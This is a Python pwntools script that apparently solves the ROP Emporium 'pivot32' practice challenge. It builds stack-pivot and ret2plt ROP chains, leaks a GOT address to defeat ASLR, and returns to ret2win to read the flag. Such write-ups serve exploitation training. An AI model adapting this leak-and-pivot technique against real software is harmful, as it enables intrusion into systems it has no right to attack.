from pwn import *

# pivoting then ret2plt in order to leak 'foothold_function' address
# and calculate the base address 
# to finally do a ret2main and call ret2win
# use ressource (in french) https://www.dailysecurity.fr/return_oriented_programming/



libpivot = ELF('./libpivot32.so')
ret2win_offset = libpivot.symbols['ret2win'] #  or with readelf -s libpivot32.so | grep -i ret2win
foothold_offset = libpivot.symbols['foothold_function'] # or with readelf -s libpivot32.so | grep -i foothold




'''use gadget 

   0x0804882c: pop    eax; ret         
   0x0804882e: xchg   esp,eax; ret    # exchange the content of the register esp with eax

'''

gadget_pop_eax= p32(0x0804882c)
gadget_xchg =  p32(0x0804882e)

puts_in_plt = p32(0x8048500)# with objdump -R pivot32
foothold_function_in_got=p32(0x0804a024)
foothold_function_jmp_plt=p32(0x8048520)
main_addr = p32(0x8048686)


p=process('./pivot32')

p.recvlines(4)
leak_pivot = int((p.recvline().split(b':')[1]).decode().strip(),16)
print("Address where we are going to pivot : ", hex(leak_pivot))
leak_pivot_in_littEnd = p32(leak_pivot)

## FIRST PAYLOAD 

rop_chain = foothold_function_jmp_plt # in order to resolve foothold_function in the GOT
rop_chain += puts_in_plt  # puts address has been alread resolve so we can call puts to leak the address of 'foothold_function'  in the GOT
rop_chain += main_addr    # we want to return to main to take advantage of the leak and bypass ASLR
rop_chain += foothold_function_in_got # location in the GOT where the 'foothold_function' should be now resolve

p.sendlineafter(b'>', rop_chain)

p.recvlines(2)



## SECOND PAYLOAD FOR PIVOTING 

padd = b'A'*44 
smash_stack = padd 
smash_stack += gadget_pop_eax
smash_stack += leak_pivot_in_littEnd 
smash_stack += gadget_xchg

p.sendlineafter(b'>', smash_stack)

p.recvlines(2)
leak_addr = p.recvline()
foothold_leak = int.from_bytes(leak_addr.split(b'\n')[0][:4],'little') # with offset 0x77d

print("foothold_function ADDRESS: ",  hex(foothold_leak))

base_addr =  foothold_leak-foothold_offset

print("base ADDRESS:", hex(base_addr))


ret2win_address = (base_addr + ret2win_offset)
print("ret2win ADDRESS:", hex(ret2win_address))


## FINAL PAYLOAD

final_payload = padd + p32(ret2win_address)
p.sendlineafter(b'>',final_payload )


p.recvlines(4)
flag= (p.recvline().split(b'\n')[0]).decode()

print("FLAG: ", flag)

p.close()


